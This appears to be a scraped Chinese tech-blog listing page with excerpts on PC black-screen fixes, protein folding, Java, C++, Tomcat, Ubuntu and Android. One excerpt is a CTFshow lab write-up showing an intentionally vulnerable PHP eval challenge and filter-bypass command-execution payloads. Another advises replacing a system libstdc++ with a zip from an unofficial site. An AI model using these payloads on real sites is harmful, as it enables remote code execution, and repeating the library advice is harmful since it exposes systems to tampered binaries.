3、安装的软件或插件与系统兼容性之间有冲突。可以强制关闭电脑3次，然后重新启动电脑。出现【恢复界面】后，选择【安全模式】，然后电脑将重新启动以进入【安全模式】。再打开【应用程序和功能】，并删除最近安装的【软件或插件】里面的【插件】；
4、系统受到恶意软件或病毒的侵害，这可能导致系统出现故障。同样是强制关机3次，然后重新启动计算机。【恢复界面】将出现。选择【安全模式】，然后计算机将重新启动以进入【安全模式】。进入这个模式后，使用安全软件杀死病毒。
二、电脑黑屏的恢复键 当你打开电脑，电脑启动后一直黑屏怎么办？来看看下面的3个键，让你快速解决黑屏问题。
1、重新启动电脑，然后同时点击【Ctrl+Alt+Delete】组合键。
2、按【Fn+F2】，这是切换黑屏并恢复正常的键。
3、如果黑屏是因为系统原因造成的，启动电脑后重复点击【F8】进入系统操作菜单。选择里面的【安全模式】，单击【开始】，选择【所有程序】。然后单击【附件】里面的【系统工具】，再点击【系统还原】，出现【系统还原对话框】后，选择【将我的电脑还原到更早的时间】。
出现黑屏不要着急，可以通过方法来解决这个问题。电脑黑屏按什么键恢复？让我们再回顾一下有哪3个键：【Ctrl+Alt+Delete】；【Fn+F2】；【F8】。通过这3个键，基本都能解决电脑黑屏的问题，有需要的赶紧来操作吧！
往期推荐：
电脑卡怎么办？4招帮你解决电脑卡顿的烦恼！https://mp.csdn.net/mp_blog/creation/editor/128128232回收站不见了怎么恢复？一招把回收站的图标找回来！https://mp.csdn.net/mp_blog/creation/editor/128127617
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dcc6e8539530fed98bad833d9402b90/" rel="bookmark">
			《Protein Actions Principles and Modeling》-《蛋白质作用原理和建模》中文分享（7）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​《Protein Actions Principles and Modeling》-《蛋白质作用原理和建模》
本人能力有限，如果错误欢迎批评指正。
第三章：Proteins Have Stable Equilibrium Conformations
（蛋白质具有稳定的平衡构想）
-天然状态和变性状态是蛋白质的稳定状态
稳定的平衡构象是蛋白质的一个重要特征。蛋白质在给定的天然条件下具有特定的天然结构，并且在给定的变性条件下具有特定的变性结构。这样的结构变化不依赖动力学过程实现。因此，只要蛋白质处在同一环境下，在细胞中的核糖体上折叠的蛋白质与在试管中折叠的蛋白质处于相同的构象状态。这意味着蛋白质性质通常可以通过平衡热力学来表达，而不需要路径信息。但是，有一些例外。蛋白质晶体或聚集体的结构有时取决于初始条件或它们形成的速度。在这里，我们仅探索蛋白质的一些稳定状态以及维持它们的因素。
蛋白质稳定性很重要，原因有几个。细胞能维持蛋白质稳态（即一个细胞中所有蛋白质或蛋白组的折叠稳态）。当面对蛋白质降解或错误折叠和聚集的情况时，细胞已经会利用一些复杂的机制来维持和调节蛋白质稳定性和构象平衡。这些机制包括了使用伴侣（帮助其他蛋白质折叠的蛋白质），蛋白酶，蛋白酶体以及控制蛋白质合成和降解率。蛋白质的稳定性也是淀粉样蛋白和其他疾病如衰老和癌症的影响因素。其次，蛋白质稳定性可以用于深入了解蛋白质折叠的力量。第三，在开发生物技术治疗（蛋白质药物）时，必须了解规定蛋白质折叠，降解，聚集，溶解，结晶和原纤化的溶液条件。
在生物条件下，蛋白质通常是折叠的或天然的。在恶劣条件下-在酸或碱中，在高温下或在化学变性剂中-蛋白质可以展开或变性。蛋白质结构的变化是可逆的或不可逆的。可逆意味着如果你使蛋白质偏离其初始状态-即使产生大的变化-你可以通过重新建立初始条件，使蛋白质将返回其初始的构象状态。而找到可逆性变性的优点是可以使用平衡热力学来解释现象。
蛋白质的某些转化是不可逆的。例如，高温可以通过水解谷氨酰胺和天冬酰胺的酰胺侧链基团，去除NH2基团并将剩余的侧链转化为谷氨酸或天冬氨酸来共价降解蛋白质。蛋白质骨干可以被蛋白酶共价降解。共价降解是不可逆的，因为在共价键断裂后降低温度或去除蛋白酶不会使蛋白质恢复到其原始结构。
在高浓度下，蛋白质可以可逆或不可逆地结晶或聚集。蛋白质之间的不可逆聚集可能来自蛋白质之间的共价结合，例如通过二硫键形成，或者当链变得高度缠绕以至于它们不能在实验时间尺度上彼此分离时。在本章中，我们专注于可逆过程。
直到20世纪60年代，蛋白质是否可以可逆地折叠和展开是一个重点研究的问题。以前，蛋白质科学因无法纯化蛋白质而受到阻碍。实验主义者经常无意中研究了不可复制的过程，如聚合。目前尚不清楚蛋白质结构是热力学稳定的物质状态。Christian B Anfinsen在20世纪60年代早期对牛胰腺核糖核酸酶A的实验首次证明折叠是可逆的，并且蛋白质的天然状态在热力学上是稳定的。Anfinsen破坏了天然二硫化物键，使蛋白质变性，然后重新建立了天然条件，并发现蛋白质正确地重新折叠。当时，二硫化物结合是选择的方法，因为二硫化物是可捕获且可识别的。他的工作，他获得了1972年诺贝尔化学奖，表明蛋白质的天然结构可以完全编码在其氨基酸序列中（即，它是热力学稳定的），因此成功的折叠不需要特殊的动力学信息。也就是说细胞中的蛋白质折叠可以由其他分子辅助完成。例如，已知一些蛋白质经历共翻译折叠；它们的折叠发生在它们被核糖体释放时，即边翻译边折叠。并且，许多蛋白质的折叠通常是在称为伴侣的蛋白质类的帮助下在体内进行，这有助于其他蛋白质在细胞内折叠并防止它们的错误折叠和聚集。然而，许多小的单域蛋白在试管中常规展开和可逆地重新折叠，没有生物辅助分子。因此，蛋白质的天然结构是稳定的平衡状态。
测量蛋白质稳定性的基本实验是平衡变性。你配制了一系列不同的蛋白质溶液，1，2，...，M，并且具有不同数量的变性剂x1，x2，...，xM。通过“变性剂”，我们指的是温度或化学物质，例如盐酸胍（GuHCl），尿素，酒精或酸或碱。然后，在每个具有特定量x的变性剂溶液，，可以计算出（通常通过某种形式的光谱学）天然蛋白质分子的比例fN(x)和变性蛋白质分子的比例fD(x)=1-fn（假设只观察这两种状态，这是一种常见的情况）。增加变性剂增加D相对于N的数量。在没有变性剂的情况下，蛋白质是完全天然的（波动除外）。在高浓度的变性剂中，蛋白质变性。图3.1 a显示高温变性；图3.1 b显示了高浓度尿素的变性。作为变性剂x的函数，称为熔化或变性曲线的这种图通常是Sigmoid形状。在中点，变性浓度的微小变化会改变蛋白质构象的分布。从这个意义上说，蛋白质变性是较大系统中相变的小型化版本；例如，在正确的温度下，温度的微小变化会导致水沸腾或冻结。
图3.1 蛋白质因温度升高或变性浓度而变性。(A)核糖核酸酶A的热变性，如通过光谱和粘度测量确定的。(B)如通过光谱法测定的核糖核酸酶T1的尿素诱导的变性。
要想了解变性的概念，那么必须先了解什么是自由能。自由能分为两种吉布斯自由能G和亥姆霍兹自由能F。F在如何处理压力-体积效应上与G不同。压力-体积变化对于气体或气液系统来说可能很大，对于蛋白质溶液来说通常很小。所以焓H和内能U是等价的，即H≈U。吉布斯自由能G(T,P,N)=H-TS≈F(T,V,N)=U=TS等价于亥姆霍兹自由能F。实验研究通常报告自由能G和焓H。自由能G可用于表示折叠自由能。将蛋白质从其变性状态(D)折叠到其天然状态(N)，其自由能的变化ΔGfold = GN-GD.此外，天然状态的比例(fN)和变性状态(fD)的比值可作为折叠平衡常数K,其方程式为
而折叠自由能的方程可以定义为
其中T是绝对温度（以开尔文为单位），R是气体常数。而展开的自由能计算则为ΔGunfold =-ΔGfold。
图3.2 使用式3.1和3.2.（A和B）的变性曲线可以确定折叠自由能。尿素或GuHCl等变性剂的自由能依赖为线性(C)，因此在没有变性剂的情况下可以推断ΔGfold。相反，具有温度依赖性的(D)是弯曲的。
图3.2 A说明化学变性，图3.2 C显示折叠自由能ΔGfold(c)和GuHCl变性剂浓度c的相互关系。ΔGfold(c)几乎与c呈线性相关。ΔGfold(c)与浓度c的斜率为m。
加热也是一种使蛋白质变性的方法（见图3.2B）。ΔGfold(T)通常是温度T的曲线函数（见图3.2D）.您可以在量热计中测量蛋白质的性质作为温度的函数。差示扫描量热计将一系列不同的温度应用于平衡的蛋白质溶液.量热计测量蛋白质溶液在每个温度下吸收或释放的热量。随着温度的上升，蛋白质会不断地吸收热量直至展开。而开始变性的温度Tm称为熔化温度或变性温度-是蛋白质变性转变的中点。蛋白质展开过程中的过量热量：展开的热量变化减去纯溶剂的热量变化。作为实际问题，可以通过减去斜率基线或积分获得焓并找到斜率来获得变性点ΔCp=dH/dTm。
热量实验表明，蛋白质变性类似于熔化过程。在其熔点，因为键的断裂，材料的能量和熵都随着温度急剧增加。类似地，在热变性的中点温度下，蛋白质的能量和熵也会急剧增加。增加的能量表明一些链内相互作用被破坏，增加的熵表明系统获得了构象自由。为了更深入地探索这一点，我们现在进行建模。要做到这一点，我们需要热力学和统计力学的语言，我们稍后会对此进行评论。但首先，让我们看看如何从实验变性曲线转换为自由能。从ΔGfold(T)的温度依赖性中，您可以通过热力学关系获得两个分量量：折叠时焓的变化，ΔHfold(T)和折叠时熵的变化，ΔSfold(T)。
其中ΔGfold(c)和ΔGfold(T)曲线能够更好地理解驱动蛋白质构象变化的作用力。
首先，我们先了解一下蛋白质的天然构象然后来理解稳定其构象的作用力。蛋白质的具有紧凑的天然构象并且其中心大多数是疏水性的，而这意味着疏水作用力在蛋白质折叠中的相互作用。让我们回顾一下蛋白质的二级结构α-螺旋和β-折叠。他们的一个重要特点就是具有氢键。蛋白质的良好结构与范德华力也有密切的关系。一些天然蛋白质还有盐桥结构：其中一个带正电荷的原子位于一个带负电荷的原子附近通过静电吸引力而保持稳定。但是如果充分地了解蛋白质的稳定性结构，但单单看天然结构所表示的东西是不够的。链熵的变化就可以很大，但是其无法直观地在结构上观察到。这个时候，我们可以尝试使用统计力学模型来深入了解熵。
图3.4 基于它们在链序列中的分离程度，相互作用分为为局部和非局部。
首先，我们学习一下局部作用和非局部作用这两个概念（图3.4）。局部作用指的是那些在蛋白质链上靠的很近的氨基酸的相互作用，如在螺旋和turn中。非局部相互作用是指链序列中距离较远的氨基酸之间的相互作用，如β-折叠。例如，当两种油样氨基酸取代水相互接触时，就会形成非局部的相互作用。蛋白质的稳定性来自于这两种类型的相互作用。局部分离与非局部分离是指接触单体之间的链分离的术语，可以区分为短程与长程，指相互作用单体之间通过空间的距离。库仑相互作用在空间中是长距离的（能量取决于距离r的1/r），范德瓦尔斯吸引在空间中是短距离的（取决于1/r6）。这里简要总结了蛋白质中非共价键相互作用的类型。
疏水效应是指油水和水分离的趋势。20种氨基酸侧链中，大约有一半具有油状或非极性的特征。在蛋白质的天然结构中，蛋白质的非极性氨基酸往往被埋在其核心内，这意味着至少在一定程度上是由蛋白质的折叠收到了非极性氨基酸躲疏水倾向的影响。这里有两个迹象表明了疏水相互作用在蛋白质折叠中的重要性：(1)蛋白质被溶剂展开，如GuHCl、尿素、醇和表面活性剂，它们削弱了蛋白质折叠的疏水驱动力，(2)对于典型的小蛋白，有一个很大的展开热容量，ΔCp.unfold&gt;0。较大的正热容是简单系统中疏水效应的一个特征。疏水相互作用的一个特征指纹是，非极性分子，如苯、甲苯或烷烃，从其纯液态向水溶液的变化会增加热容量。ΔCp=Cp,with solute-Cp,without solute(表3.1)
表3.1 在23◦C时，非极性分子向水中的转移是不利的（自由能为正的），以熵为主，并与热容的正变化有关。
疏水效应是水-水氢键作用的结果。粗略地说，两个水分子之间的氢键很强，所以水分子倾向于在溶质周围配置，以最大限度地增加它们与其他水分子的氢键。换句话说，两个放入水中的非极性分子会相互结合，以减少它们暴露在水中的程度，从而最大限度地增加水与水之间的氢键。疏水性尺度近似表示了不同类型的分子从水分裂为油样环境的相对趋势。图3.5显示了两疏水尺度表。
图3.5 氨基酸的两种疏水性尺度。一个5分子肽在中间位置有20种不同的氨基酸中的一个。肽从水中到(A)一脂质双层界面或(B)辛醇介质。橙色的条表示相对于水的（疏水）残留物，绿色的条表示有利于生活在水中的（带电和极性）残留物。水平虚线表示肽键对所有氨基酸的贡献。组氨酸(H)显示了两次，因为它具有带电和不带电的形式（带电的形式在左边）。
根据油的类型和测量条件，氨基酸有许多不同的疏水性尺度。一般来说，在一个尺度上登记为疏水的分子在其他尺度上趋向于登记为疏水，但在不同尺度之间存在差异。3.6说明了疏水性尺度的一个应用；它表明，蛋白质序列中的疏水氨基酸串可以识别膜蛋白的跨膜部分。
图3.6 水性图确定了定义膜蛋白跨膜区域的疏水序列。亲水性图使用疏水性尺度来显示疏水性作为序列位置的函数。橙色表示疏水区域，而绿色表示极性或带电区域。（A)细菌视紫质有7个跨膜的α-螺旋，对应于(B)在亲水性图中的7个橙色峰。
当氢键供体基团（如酰胺，−-N-H）与接受基团（如羰基氧，O==C-）共享其氢时，会形成氢键，如−-N-H···O==C-。氢键在天然蛋白质结构中广泛存在，主要在骨干羰基和酰胺中，特别是在a-螺旋和b-折叠中。突变研究以及使用渗透压剂如三甲胺N-氧化物（TMAO）的实验，表明氢键对蛋白质稳定性的贡献在0.3至1.5kcal/mol之间，虽然令人怀疑的是蛋白质中是否存在“平均”氢键。氢键的强度在很大程度上取决于它们的环境。在真空中，氢键可以达到5至10kcal/mol。在蛋白质中，“氢键强度”是指天然蛋白质中氢键的自由能与变性状态中氢键的自由能之间的差异，而这些蛋白质通常在水分子的包围中。氢键具有显着的静电特性。因此，它们在介电常数低（估计为2-12）的油状环境（如蛋白质内部）中比在介电常数高（约80）的水状环境中更强。
氨基酸紧密包装在天然蛋白质核心中。这样的紧密包装结构主要受到范德华相互作用的影响。范德华力是（1）将原子聚集在一起的短程吸引力，以及（2）在更短程的排斥力，防止两个原子占据同一空间。范德华吸引力和排斥力在很大程度上影响蛋白质核心中氨基酸的紧密空间结合。突变研究表明，有效填充空间的趋势与疏水相互作用一样强。例如，在空腔中添加甲基使蛋白质稳定约0.9kcal/mol。
紧密包装并不困难。在罐子里摇动坚果和螺栓，它们也会很好地包裹。有趣的是，蛋白质内部填充的空间比例约为74%，这与相同球体的最大密度包装大致相同。白质内部怎么会如此密集？事实证明，通过将小的，大的和不规则的物体混合在一起，你有时可以通过有效地填充角落和缝隙来更紧密地包装空间使其填充率超过74%。例如，想想大理石如何填充包装良好的保龄球之间的小空间。类似地，，氨基酸通过它们不同的大小和形状，也可以很好地填充空间。在下面的文本中，我们描述了这些不同类型的力如何有助于蛋白质稳定性。
为了了解这些力如何有助于蛋白质折叠和展开，我们从几个基本前提开始。首先，蛋白质是链分子。链分子可以采用许多不同的构象，因为不同的骨干扭转态通常具有相似的能量。此外蛋白质的变性构象比原生构象多得多。也就是说，蛋白质通过展开到大量变性构象来增加链熵。第二，天然结构通过链内相互作用稳定，其中包括范德华，氢键合，静电和疏水相互作用。第三，侧链交互在折叠代码中起着与主干交互不同的作用。主干相互作用无法解释折叠原理，因为所有蛋白质具有相同的主干原子：溶菌酶由于其不同的侧链序列而与核糖核酸酶折叠不同。此，为了解释蛋白质折叠原理，我们关注解释蛋白质内部的疏水相互作用。电荷相互作用也编码在侧链中，但大多数蛋白质中的电荷相互作用相对较少，并且它们往往位于蛋白质表面，主要是在水中，在那里它们相互作用很弱。第四，蛋白质折叠过渡的尖锐性是球状蛋白质的一个近乎普遍的特征。在讨论折叠物理学之前，我们首先简要回顾统计力学，主要是玻尔兹曼分布定律的内容。
-------------------------------------------
欢迎点赞收藏转发！
下次见！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b752c7d4844853a13cc303164a1ef12d/" rel="bookmark">
			[CTFSHOW]命令执行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 web 29web 30web 31web32web33-36web37web38web40web41web42web43web44web45web46web47-48web49web50web51web52web53web54web55-56web57web58web59web60web61-65web66-67web68-70web71web72web73-74web75-76web77参考文章 web 29 &lt;?php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match("/flag/i", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 我这里只想到五种简便的方法：
通配符 payload1:c=system("nl fla?????"); payload2:c=system("nl fla*"); payload3:c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`; payload4:c=echo `nl fl\ag.php`;//转义字符绕过 payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php payload6:c=eval($_GET[1]);&amp;1=system('nl flag.php'); payload7:c=awk '{printf $0}' flag.php|| 还有很多姿势，毕竟等于没过滤 web 30 在上一道题的基础上多了system和php
&lt;?php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match("/flag|system|php/i", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 但是我们可以用其他函数鸭
system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 同shell_exec() payload:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b752c7d4844853a13cc303164a1ef12d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fbf661c3071200579e0bb8e4b21adbc/" rel="bookmark">
			关于getMethod()方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		getMethod方法要注意的地方：
类对象.getMethod(mName,HttpServletRequest.class,HttpServletResponse.class);
第一个参数是mName“方法名称”
第二个参数是“方法参数的类对象”//这个就是为什么他是.class的原因，为什么参数是类对象？因为这个是Java规定的
举个例子 这是一个抽取出的通用的servlet（页面请求经过的第一个servlet，所有页面请求必须经过的一个servlet, baseservlet）
protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
//1.获取方法名称
String mName = request.getParameter("method");
//2.获取方法对象
Method method = this.getClass().getMethod(mName,HttpServletRequest.class,HttpServletResponse.class);
//3.让方法执行，接受返回值
String path = (String) method.invoke(this, request,response);
//4.判断返回值是否为空，若不为空，统一处理请求转发
if(null != path) {
request.getRequestDispatcher(path).forward(request, response);
}
} catch (Exception e) {
e.printStackTrace();
throw new RuntimeException();
}
}
三、这是一个具体执行某类操作的servlet（这里是执行用户注册的servlet，页面请求经过的第二个servlet，userservlet）
public String registUI(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
return "/jsp/register.jsp";
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95518f29578a5381446dc7cce6e19654/" rel="bookmark">
			c&#43;&#43; 乘车费用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 时间限制: 1.000 Sec 内存限制: 128 MB
提交: 259 解决: 105
[状态] [提交] [命题人:外部导入]
题目描述
星期天上午小红乘出租车去本市的奶奶家。出租车计价方案为：3公里以内（包括3公里）起步价是13元，超过3公里之后按以2.3元/公里计价，整个乘车途中另加1元钱的燃油费。己知：小红到奶奶家的路程为N公里，请你计算一下小红到奶奶家的出租车费用是多少元?
输入
只有一行，包含1个整数 N(其中1&lt;=N&lt;=100）表示路程，单位：公里。
输出
只有一行，包含1个整数，表示乘车N公里后，出租车的费用（要求四舍五入保留整数），单位：元。
样例输入 Copy
2 样例输出 Copy
14 #include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; cin&gt;&gt;n; double s; if(n&lt;=3) { s=13; } else { s=(n-3)*2.3+13; } s=s+1; cout&lt;&lt;fixed&lt;&lt;setprecision(0)&lt;&lt;s; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9405bb190c9c253bdde72c821948921/" rel="bookmark">
			C&#43;&#43;题目：反向输出四位数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		反向输出四位数 题目描述 给定一个四位数的正整数 n = a b c d ‾ n=\overline{abcd} n=abcd，请反向输出 n n n，即输出 d c b a ‾ \overline{dcba} dcba。
输出时保留前导 0 0 0。
输入格式 输入共一个正整数 n n n。
输出格式 反向输出正整数 n n n。
样例 #1 样例输入 #1 1230 样例输出 #1 0321 提示 对于 100 % 100\% 100%的数据, 1000 ≤ n ≤ 9999 1000 \le n \le 9999 1000≤n≤9999。
答案 #include&lt;bits/stdc++.h&gt; using namespace std; int main(){ int x,a,b,c,d; cin &gt;&gt; x; d = x%10; c = (x/10)%10; b = (x/100)%10; a = x/1000; cout &lt;&lt; d &lt;&lt; c &lt;&lt; b &lt;&lt; a; return 0; } 拓展 那如果是n位数呢？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9405bb190c9c253bdde72c821948921/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/269c12a74d62eb960288e9d5c33f90ff/" rel="bookmark">
			Json 解析报错 InvalidCastException: Null object cannot be converted to a value type.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这个报错按理来说是因为解析了空对象才出现,但是我的json是有值的,就很奇怪,搜了一下添加了个jsonsetting解决了
// 设置json序列化忽略null JsonSerializerSettings jsonSerializerSettings = new JsonSerializerSettings(); jsonSerializerSettings.NullValueHandling = NullValueHandling.Ignore; // 这样就不会报null的错误了 List&lt;SeniorCourseQhPhoneList.Data.PhoneContentList&gt; phoneContentLists = JsonConvert.DeserializeObject&lt;List&lt;SeniorCourseQhPhoneList.Data.PhoneContentList&gt;&gt;(json, jsonSerializerSettings); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f073abb227344042e8cce160bb3863a/" rel="bookmark">
			Seal库官方示例（四）：bgv_basics.cpp解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本代码计算的是一个 x 8 x^8 x8，BGV和BFV的密文计算很相似，主要区别在于系数模选取以及噪声的控制。当然这是浅层代码层面，实际上的区别还有最大最小编码问题，乘法区别等等，当然这些能从深层代码细节（encrypt.cpp、evaluator.cpp等等）里看到，浅层里，SEAL库作者们已经为我们统一了。 （牛逼！（破声））
所以这个例四也没啥好写，和bfv里面长得太像了。
代码解析 参数设置 和BFV差不多，这里的系数模暂时选用的默认的，后续会有说明如何选取。
EncryptionParameters parms(scheme_type::bgv); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); parms.set_plain_modulus(PlainModulus::Batching(poly_modulus_degree, 20)); SEALContext context(parms); print_line(__LINE__); cout &lt;&lt; "Set encryption parameters and print" &lt;&lt; endl; print_parameters(context); 密钥生成 也和BFV基本一样
KeyGenerator keygen(context); SecretKey secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); 这里叨叨两句，从论文里看，BGV和BFV的评估密钥生成貌似应该是不一样的，BGV定义的是密钥交换，BFV是重线性化。然后去找了一下源码，发现生成重线性化密钥的时候是调用了密钥交换方法的。又跑回去看看原来的文章，发现重线性化基本上就是密钥交换，核心都是把密钥的乘积项处理了一下，那么代码能统一到一起就不见怪了。
编码 插槽数同样是阶数，编码前同样看作一个 2 × N 2 2 \times \frac N2 2×2N​的矩阵
BatchEncoder batch_encoder(context); size_t slot_count = batch_encoder.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f073abb227344042e8cce160bb3863a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8265b6632ea4fe94704d7cd3e7cd1a23/" rel="bookmark">
			Linux服务器启动tomcat的三种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		直接进入主题，首先cd进入tomcat的bin文件夹下，然后可以尝试以下三种启动方式：
第一种（当前会话启动）： ./startup.sh 效果:
然后tomcat就在后台启动了，我们还可以在当前会话中继续输入其它指令，比如
ps -ef | grep 'tomcat' 来查看我们刚才启动的tomcat服务：
可以看到它的进程id是6951，我们可以使用如下指令将其关闭
kill 6951 这种启动方式是直接后台启动，但不是让tomcat一直就在后台跑了，当我们关闭当前连接linux的会话窗口，tomcat服务也将随之关闭。
第二种（带日志的当前会话启动）：
./catalina.sh run 效果：
与第一种方式不同的是，第二种方式启动后会显示日志，相当于当前Linux连接会话已经成为了控制台，不能再输入其它Linux指令，而与第一种方式相同的是，当当前连接关闭时，本次启动的tomcat服务也会随之关闭。当然，启动成功后我们也可以使用ctrl + c来直接关闭本次链接会话中tomcat的启动。
第三种（后台永久启动）：
1.最简单的写法：
nohup ./startup.sh &amp; 2.手动指定tomcat启动时的日志路径：
nohup ./startup.sh &gt; log.file 2&gt;&amp;1 &amp; 想要明白这两者的区别，就要看nohup的具体使用方法了：
&gt;log.file是将command的输出重定向到log.file文件，即输出内容不打印到屏幕上，而是输出到log.file文件中。2&gt;&amp;1 是将标准出错重定向到标准输出，这里的标准输出已经重定向到了log.file文件，即将标准出错也输出到log.file文件中。最后一个&amp;， 是让该命令在后台执行。试想2&gt;1代表什么，2与&gt;结合代表错误重定向，而1则代表错误重定向到一个文件1，而不代表标准输出；换成2&gt;&amp;1，&amp;与1结合就代表标准输出了，就变成错误重定向到标准输出。 原文链接：https://blog.csdn.net/m0_54853420/article/details/123975074
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b4669fda3499a31b7ee6da60c008db9/" rel="bookmark">
			为ubuntu配置WiFi
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前提条件 ubuntu不论什么版本，如果想要正常使用wifi，必须在电脑的bios中把secure boot设定为disable
2.快捷指令（WiFi相关的常用命令行指令） 2.1查看电脑连接的蓝牙和网卡设备 rfkill list all 0: hci0: Bluetooth 这个是我电脑的蓝牙 Soft blocked: no Hard blocked: no 1: phy0: Wireless LAN 这个是我电脑内的网卡 Soft blocked: no Hard blocked: no 2: phy1: Wireless LAN这个是插到电脑上的usb网卡 Soft blocked: no Hard blocked: no 拔掉usb网卡后显示：
网上人有说联想电脑出现Hard blocked: yes，可以在终端输入：sudo modprobe -r ideapad_laptop，参考可能解决方案；
2.2查看所有设备的型号 lspci 这里的
00:14.3 Network controller: Intel Corporation Device 06f0 这个是网卡型号 00:15.0 Serial bus controller [0c80]: Intel Corporation Device 06e8 这个是有线网卡型号 或者
2.3单独查看网络设备 lspci -nnk | grep -i net 这里的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b4669fda3499a31b7ee6da60c008db9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/048f7bed7e0a5f0b1f852ced85939a7d/" rel="bookmark">
			运行报错：/usr/lib/x86_64-linux-gnu/libstdc&#43;&#43;.so.6: version `GLIBCXX_3.4.26‘ not found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 自己的环境：
Ubuntu 16.04 ， ros-kinetic
一、报错描述 运行程序时报错：
/usr/lib/x86_64-linux-gnu/libstdc++.so.6: version `GLIBCXX_3.4.26' not found 通过这个报错可以看出，报错提示缺少 GLIBCXX_3.4.26，也就是缺少 libstdc++.so.6.0.26 。
（报错提示缺少 GLIBCXX_3.4.22，也就是缺少 libstdc++.so.6.0.22 ）
通过以下指令可以查看当前的系统版本：
strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX 通过上图可以发现，确实缺少 GLIBCXX_3.4.26。
二、解决方法 下载libstdc++.so.6.0.26 ： 通过链接 http://www.vuln.cn/wp-content/uploads/2019/08/libstdc.so_.6.0.26.zip 直接下载。
解压，得到文件 libstdc++.so.6.0.26，比如解压到了 ~/Download/ 下；移动到文件夹下 /usr/lib/x86_64-linux-gnu/ sudo mv libstdc++.so.6.0.26 /usr/lib/x86_64-linux-gnu/ 重新建立软连接 cd /usr/lib/x86_64-linux-gnu/ sudo rm libstdc++.so.6 # 移除掉原来的软连接文件 ln libstdc++.so.6.0.26 libstdc++.so.6 通过以下指令可以查看当前的系统版本： strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX 通过上图可以发现，现在已经安装 GLIBCXX_3.4.26 成功了～～
参考链接 [1] 轻枫柳曳1208. version `GLIBCXX_3.4.20’ not found 解决方法 [EB/OL].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/048f7bed7e0a5f0b1f852ced85939a7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34d1427eb40045aecf0c5a72aa5307f1/" rel="bookmark">
			【Android】Fragment使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Fragment 我们可以把页面结构划分成几块，每块使用一个Fragment来管理。这样我们可以更加方便的在运行过程中动态地更新Activity中的用户界面，日后迭代更新、维护也是更加方便。 Fragment并不能单独使用，他需要嵌套在Activity 中使用，尽管他拥有自己的生命周期，但是还是会受到宿主Activity的生命周期的影响，比如Activity 被destory销毁了，他也会跟着销毁！一个Activity可以嵌套多个Fragment。
1. 基本概念 2. Fragment 生命周期 ①Activity加载Fragment的时候,依次调用下面的方法: onAttach -&gt; onCreate -&gt; onCreateView -&gt; onActivityCreated -&gt; onStart -&gt;onResume
②当我们启动一个新的页面, 此时Fragment所在的Activity不可见，会执行 onPause
③当新页面返回后，当前Activity和Fragment又可见了，会再次执行onStart和 onResume
⑥退出了Activity的话,那么Fragment将会被完全结束, Fragment会进入销毁状态 onPause -&gt; onStop -&gt; onDestoryView -&gt; onDestory -&gt; onDetach
